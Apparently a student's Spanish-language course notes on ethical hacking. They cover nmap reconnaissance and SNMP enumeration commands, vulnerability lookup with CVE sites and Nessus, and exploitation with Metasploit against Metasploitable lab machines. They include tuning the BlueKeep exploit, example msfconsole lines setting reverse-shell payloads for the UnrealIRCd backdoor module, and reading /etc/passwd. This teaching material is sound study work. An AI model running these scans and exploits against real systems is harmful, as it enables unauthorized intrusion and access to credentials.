 - sudo nmap -v --reason -sS -oX puertos.xml --stylesheet="https://svn.nmap.org/nmap/docs/nmap.xsl"  192.168.157.125-135
 - sudo nmap -sS 192.168.157.125-135
 - sudo nmap -sS 192.168.157.0/24
 - sudo nmap -sS 192.168.157.128 -p 80
 - sudo nmap -v --reason -sV -oX servicios.xml --stylesheet="https://svn.nmap.org/nmap/docs/nmap.xsl"  192.168.157.125-135
 - sudo nmap -v -O 192.168.157.128
 - sudo nmap -v -sS -p 139,445 192.168.157.129
 - sudo nmap -v -sS -p 139,445 --script=smb-os-discovery 192.168.157.129
 - sudo nmap -v -sU -p 161 --script=snmp-win32-software 192.168.157.129s
 - sudo nmap -v -sU -p 161 --script=snmp-win32-users 192.168.157.129
 - sudo nmap -v -sU -p 161 --script=snmp-processes 192.168.157.129
 - sudo nmap -v -sU -p 161 --script=snmp-netstat 192.168.157.129
# Fin de la recopilacion activa de informacion
# Clase teorico practica dia 17 01/10/2024
## Analisis de vulnerabilidades    
 - Esta fase consistew en la identificacion de fallos de seguridad que se encuentren presentes en los sistemas que se estan evaluando
 - el tipo de fallos abarca desde errores en la configuracion de un servicio hasta vulnerabilisdades en determinados servicios que sean publicos y puedan comprometer la integridad del mismo
#### Links y ayudas
 - https://cve.mitre.org/cve/search_cve_list.html
 - nvd.nist.gov/vuln/search/
 - https://www.cvedetails.com/vulnerability-search.php
###  CVE, CVSS, CPE - Common Vulnerabilities and Exposures
 - En esta clase vimos como buscar y clasificar de manera sencilla las vulnerabilidaddes que habiamos encontrado anteriormente con las recopilaciones de informacion, con diferentes sitios web que tienen repositorios sobre dichas vulnerabilidades, su nivel de complejidad y nos podrian ayudar a encontrar exploits que nos ayuden a exlotarlas
# Clase practica dia 18 02/10/2024
### Analisis de vulnerabilidades con nmap
 - Con uno de os scripts de nmap podemos realizar un análisis de vulnerabilidades, en concreto con el script=vuln tambien con sus herramientas nos permite exportarlo a un archivo xml para visualisarlo de una mejor manera, al encontrar vulnerabilidades podremos visualisar algunas de ella por medio de un navegador, tambien se encargara de usar comandos en caso de encontrar vulnerabilidades en dicho aspecto.
# Clase practica dia 19 03/10/2024
# Clase practica dia 20 07/10/2024
### Nessus
 - Nessus es la aplicacion de analisis de vulnerabilidades mas usada en el mundo, la mayoria de sus versiones son de paga asi que nosotros accedimos a la gratis que esta limitada pero nos va a aservir para probar la app, nos permite crear politicas con las cuales podemos crear analisis personalizados, tambien nos permite crear reportes respecto a el analisis que hayamos realizado y tambien, vimos los 2 tipos de analisis avanzados que tiene nessus, que son el advanced scan y el advanced scan dynamic que el dinamico nos permite personalizar los plugings que se van a usar durante dicho analisis, y el avanzado es tambien perzonalisable pero ya viene con todos los plugings habilitados de base
# Fin de el analisis de vulnerabilidaddes
# Clase teorico practica dia 21 08/10/2024
## Explotacion de vulnerabilidaddes
 - Esta fase consiste en el uso de tecnicas que permiten al analista aprovechar una vulnerabilidad identificada para obtener algun beneficio desde el punto de vista del ejercicio de hacking etico
 - se corresponde con una de las fases mas importantes e intrusvas del proceso de hacking etico
 - deben tenerse muy en cuenta las herramientas de proteccion y deteccion que utiliza la organizacion entre las que se encuentran: anti virus, EDR, IPS, IDS,  HIDS, WAF...
 - en funcion del componente tegnologico en el que se encuentra la vulnerabilidad, vamos a dividir las fases de explotacion en 
  - Explotacion de vulnerabilidades en host
  - Explotacion de vulnerabilidades en Aplicaciones web
  - Explotacion de vulnerabilidades en red
## Explotacion de vulnerabilidades en host
### Explotacion de vulnerabilidades de forma manual
 - Con la  inforamcion que hayamos obetenido en el analisis te vulnerabildiadesm podremos usar distintos tipos de exploits que nos ayudaran a explotar dichas vulnerabilidades, podemos buscar exploits por internet
 teniendo precausion ya que pueden ser virus, dichos exploits nos permitiran explotar de distintas formas las vulnerabilidades que hayamos encontrado en dicho escaneo y buscando en linea podremos saber que tipo de vulnerabilidad es y como explotarla
 en la clase de hoy vimos como explotarla de manera manual modificando el codigo o dicha exploit con emacs, tambien usamos netcat para escuchar y poder conocer la inforamcion que nos esta enviando dicha maquina gracias al exploit
 el exploit que usamos fue uno enfocado en tomar el control del objetivo, lo buscamos en linea lo modificamos y seguimos las instrucciones para que funcionara de manera correcta, asi pudimos obtener acceso a nuestra mauqina local
 metasploitable ubuntu y incluso ver algunos ficheros que tiene dicha maquina 
# Clase practica dia 22 09/10/2024
# Clase practica dia 23 /10/2024
## Metasploit
 - Es una herramienta/Framework tiene implementado un conjunto de exploits para todas las vulnerabilidades que van saliendo tambien se le puede implementar un modulo y el lo almacenara de forma automatica.
 Tambien tiene herramientas auxiliares que nos permiten realzar toda la fase de lanzamiento del exploit manejo de la conexion, herramientas de pos explotacion, es un entorno completo que nos facilita la creacion de exploits
 el uso de diferentes payloads, recibir la conexion manejarla etc... metasploit se fundamenta en el concepto modulo cada uno de los exploits se corresponden con un modulo, la unidad basica de metasploit son los modulos tambien
 tiene plugings, tenemos scripts, bases de datos, librerias. tambien nos permite juntar payloads con exploits, Metasploit usa el lenguaje de programacion ruby
## Informacionimportante Metasploit
 - Funcionamiento -> al buscar un exploit en especifico podremos observar si dicho exploit tiene una funcionalidad buena, excelente, mala, o manual, es importante que al momento de usarlo tener muy precente esta inforamcion ya que si el exploit tiene un uso excelente
 no va haber amyor problema al ejecutarlo, pero si por lo contrario tiene en este caso manual como lo es en el exploit *windows/rdp/cve_2019_0708_bluekeep_rce* tendremos que modificar el exploit para que funcione de manera correcta
 - Opciones -> tenemos que tener muy en cuenta las opciones o los requerimientos que nos pide el exploit para poderse ejecutar estos los podremos por con el comando *Show options* alli podremos ver todas las opciones del programa y modificar ya sea el rhos, lhost, lport, rport
 etc... Todas las opciones reuqeridas para el funcionamiento del exploit tendran un yes, asi sabremos cuales tenemos que modificar o agregar de manera obligatoria para su correcto funcionamiento
 - Modificacion de los exploits -> Para la modificacion de exploit *exploit/windows/cve_2019_0708_bluekeep_rce* que al lanzarlo contra el objetivo metasploitable windows, crasheaba el sistema operativo por que trataba de obtener una parte de la memoria inaxecible
 tuvimos que acceder al exploit y modificarlo con emacs, tendremos que modificar el groombase de el area de trabajo mas parecido al de nuestro objetivo, para poder conocer la direccion de la memoria que no esta realizando paginacion, usamos distintas pruebas pero al final lologramos de manera manual
 usamos el programa vmss2core desde nuestro equipo host, tambien necesitamos un debuger en este caso para windosw windbg, usaremos los ficheros propios de vmware, los cuales modificaremos desde el cmd de windows, para realizar un volcado de la memoria para asi realizar un analissi y encontrar la parte de la memoria
 que no esta conpaginando, con la direccion que obtengamos, usaremos emacs de nuevo desde nuestro kali linux para modificar la parte de la memoria que no estaba conpaginando, poner la parte de la memoria que si esta conpaginando
 - Payloads -> No todos los exploits dependen de un payload para su funcionamiento hay diversos tipos de exploit que podremos aprovechar sin el uso de payloads como **  y otros que dependen de uno para su funcionamiento como *use exploit/windows/cve_2019_0708_bluekeep_rce*
### Payloads 
 - singles -> payloads autocontenidos y autosuficientes no nececitan de metasploit para funcionar, ejemplo si tenemos un payload que nos devuelve una conexion podremos recibirla con la herramienta que queramos; recibir una conexion inversa, añadir un usuario 
 - stagers -> son payloads pequeños para tareas especificas que nos permiten establecer una conexion con una maquina y nos devuelven una conexion reversa y descarga o aprovecha algun payload de tipo stages para realizar alguna accion (Depende mucho mas de metasploit)
 - stages -> son payloads realizan acciones mucho mas avanzadas inyectar; una dll en un proceso, devolverr una shell encriptada(Depende mucho mas de metasploit)
### Comandos metasploit
 - search -> nos permite buscar un exploit para alguna vulnerabilidad que hayamos encontrado tambien nos permite buscar auxiliares, payloads
 - use -> nos permite usar uno de los exploits que tenga metasploit
 - back -> retrocede o cancela una accion
 - show options -> Nos muestra las opciones necesarias para el exploit funcione
 - show advanced -> Nos muestra opciones mas avanzadas de un exploit
 - set -> nos permite modificar una de las opciones del exploit
 - exploit -> Nos permite ejecutar el exploit 
 - show payloads -> Nos permite observar todos los payloads compatibles con el exploit
 - sessions -> Nos muetsra las sesiones que tenemos activas
 - msfconsole -> Con este comando accedemos a la consola de metasploit
### Ejemplos Metasploit
 - set rhost 192.168.157.128
 - set lhost 192.168.157.130
 - use unix/irc/unreal_ircd_3281_backdoor
 - show payloads
 - set payload cmd/unix/generic
 - set payload cmd/unix/reverse
 - exploit
 - use exploit/windows/cve_2019_0708_bluekeep_rce
### Comandos importantes dentro de la maquina 
 - /etc/passwd -> Nos muestra los usuarios e informacion importante